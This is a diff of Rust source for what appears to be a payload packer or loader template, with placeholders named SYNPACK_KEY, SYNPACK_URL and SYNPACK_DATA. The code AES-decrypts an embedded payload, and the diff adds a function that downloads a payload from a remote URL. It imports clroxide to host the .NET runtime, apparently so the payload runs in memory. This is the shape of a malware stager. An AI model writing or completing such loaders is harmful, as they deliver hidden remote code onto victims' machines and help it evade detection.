@@ -1,7 +1,11 @@
+#![allow(unused_imports, unused_mut)]
 use std::env;
 use aes::cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7};
+use bytes::{BytesMut, BufMut};
 use clroxide::clr::Clr;
+use futures_util::StreamExt;
 
+//AES_START
 fn decrypt_aes(buf: &mut Vec<u8>) {
 
     let key: [u8; 16] = [SYNPACK_KEY];
@@ -11,8 +15,24 @@ fn decrypt_aes(buf: &mut Vec<u8>) {
 
     Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(buf.as_mut_slice()).unwrap();
 }
+//AES_END
 
-fn main() {
+//WEB_START
+async fn get_data() -> Vec<u8> {
+    let url: &str = "SYNPACK_URL";
+    let mut stream = reqwest::get(url).await.unwrap().bytes_stream();
+
+    let mut buf: BytesMut = BytesMut::new();
+
+    while let Some(bytes) = stream.next().await {
+        buf.put(bytes.unwrap());
+    }
+    return buf.to_vec();
+}
+//WEB_END
+
+#[tokio::main]
+async fn main() {
 
     let mut bin_data: Vec<u8> = vec![SYNPACK_DATA];
 
